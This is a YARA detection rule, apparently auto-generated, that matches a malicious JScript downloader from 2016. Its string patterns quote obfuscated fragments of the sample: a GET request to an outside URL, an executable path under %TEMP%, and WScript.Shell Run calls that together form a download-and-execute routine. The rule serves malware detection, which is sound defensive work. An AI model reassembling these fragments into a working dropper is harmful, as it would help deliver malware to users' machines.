rule sig_20160329_2d20f077d3270953c43b37afde35f421 {
  meta:
    description = "datamaliciousorder - file 20160329_2d20f077d3270953c43b37afde35f421.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7db4a95fd28a228a168d1abe9cedb0a167e139bcd739e234cb5edf59084c0e06"

  strings:
    $s1  = "f[y](\"GET\", \"http://hiddenhandbags.com/kdk4a\", false);" fullword ascii
    $s2  = "function QT() {return v[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"7iAfUtmJj8p5dq2.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[S0](x() * 11); if (f[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function B(k, PU){z = z * 1; return k - PU;};" fullword ascii
    $s5  = "var v = function av() {return WScript[qg](\"WScript.Shell\");}(), e = 11;" fullword ascii
    $s6  = "function QT0(){return \"\" + SP;};" fullword ascii
    $s7  = "function p(kn){v[\"Run\"](kn, z, z);};" fullword ascii
    $s8  = "function br() {return ((cx == true) && (cx == x0)) ? 1 : z;};" fullword ascii
    $s9  = "function b()" fullword ascii
    $s10 = " while (G){" fullword ascii
    $s11 = "function ue(){return qg;};" fullword ascii
    $s12 = "return B(h, q);" fullword ascii
    $s13 = "var WW = new this[\"Date\"]();" fullword ascii
    $s14 = "function o(fB) {var S = (1, 2, 3, 4, 5, fB); return S;};" fullword ascii
    $s15 = "function x(){return 22;};" fullword ascii
    $s16 = "var s = false;" fullword ascii
    $s17 = "var cx = false;" fullword ascii
    $s18 = "var x0 = false;" fullword ascii
    $s19 = "cx = true; " fullword ascii
    $s20 = "x0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}